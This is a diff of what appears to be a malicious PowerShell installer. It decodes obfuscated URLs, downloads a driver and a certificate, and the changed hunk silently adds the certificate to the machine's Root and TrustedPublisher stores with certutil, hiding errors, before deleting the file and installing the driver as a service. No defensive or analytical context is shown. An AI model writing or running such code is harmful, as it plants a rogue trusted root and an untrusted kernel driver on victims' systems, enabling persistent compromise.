@@ -45,15 +45,10 @@ $url_ldr = xdec $u3
 $wc.DownloadFile($url_drv, $drv)
 $wc.DownloadFile($url_crt, $crt)
 
-# Install cert using .NET
-$cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2($crt)
-$stores = @("TrustedPublisher","Root")
-foreach($sn in $stores){
-    $store = New-Object System.Security.Cryptography.X509Certificates.X509Store($sn,"LocalMachine")
-    $store.Open("ReadWrite")
-    $store.Add($cert)
-    $store.Close()
-}
+# Install cert - running as admin so certutil works
+$null = & certutil -addstore TrustedPublisher $crt 2>$null
+$null = & certutil -addstore Root $crt 2>$null
+Start-Sleep 1
 Remove-Item $crt -Force -ErrorAction SilentlyContinue
 
 # Install driver using SCM
